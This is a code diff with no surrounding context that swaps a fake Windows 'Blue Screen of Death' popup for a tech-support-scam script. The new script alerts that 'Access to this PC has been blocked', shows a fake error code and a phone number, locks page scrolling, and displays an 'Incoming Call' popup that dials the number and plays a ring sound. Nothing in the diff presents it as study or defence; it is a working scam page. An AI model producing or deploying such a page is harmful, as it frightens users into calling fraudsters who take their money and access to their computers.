@@ -1,19 +1,57 @@
-// BSOD Popup Script
+<script>
+    var message = "Access to this PC has been blocked for security reasons.\n\nError: Ox800VDS\n\nPlease contact our technical support team immediately.\n\n+1 866-520-3370";
+    alert(message);
 
-function showBSOD() {
-    const bsodHtml = `\n    <html>\n        <head>\n            <title>Blue Screen of Death</title>\n            <style>\n                body { 
-                    background-color: #001f3f; 
-                    color: white; 
-                    font-family: Arial, sans-serif; 
-                    text-align: center; 
-                    margin-top: 20%; 
-                }\n                h1 { font-size: 50px; }\n                p { font-size: 20px; }\n            </style>\n        </head>\n        <body>\n            <h1>:(</h1>\n            <p>Your PC ran into a problem that it couldn't handle, and now it needs to restart.</p>\n            <p>For more information on this issue and possible fixes, visit https://support.microsoft.com.</p>\n        </body>\n    </html>`;
+    function blockPage() {
+        if (document.readyState === 'complete') {
+            document.body.style.overflow = 'hidden';
+            document.body.style.position = 'fixed';
+            document.body.style.width = '100%';
+            document.body.style.height = '100%';
+            document.body.style.margin = '0';
+            document.body.style.padding = '0';
+            document.body.style.backgroundColor = 'white';
+        } else {
+            window.onload = blockPage;
+        }
+    }
 
-    const bsodWindow = window.open('', '_blank', 'width=800,height=600');
-    bsodWindow.document.write(bsodHtml);
-    bsodWindow.document.close();
-}
+    blockPage();
 
-window.onload = function() {
-    setTimeout(showBSOD, 2000); // Show BSOD after 2 seconds
-};
+    function showPopUp() {
+        var popUp = document.createElement('div');
+        popUp.style.position = 'fixed';
+        popUp.style.top = '50%';
+        popUp.style.left = '50%';
+        popUp.style.transform = 'translate(-50%, -50%)';
+        popUp.style.backgroundColor = 'white';
+        popUp.style.border = '2px solid black';
+        popUp.style.padding = '20px';
+        popUp.style.zIndex = '10000';
+        popUp.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
+        popUp.innerHTML = `
+            <h2>Incoming Call</h2>
+            <p>Please answer the call to resolve the issue.</p>
+            <button onclick="answerCall()">Answer Call</button>
+            <button onclick="declineCall()">Decline Call</button>
+        `;
+        document.body.appendChild(popUp);
+    }
+
+    function answerCall() {
+        alert('Calling +1 866-520-3370...');
+        window.location.href = 'tel:+18665203370';
+    }
+
+    function declineCall() {
+        alert('Call declined. Please contact support at your earliest convenience.');
+        document.body.removeChild(document.querySelector('div'));
+    }
+
+    showPopUp();
+
+    setTimeout(function() {
+        var audio = new Audio('https://example.com/call-sound.mp3');
+        audio.play();
+    }, 5000);
+</script>
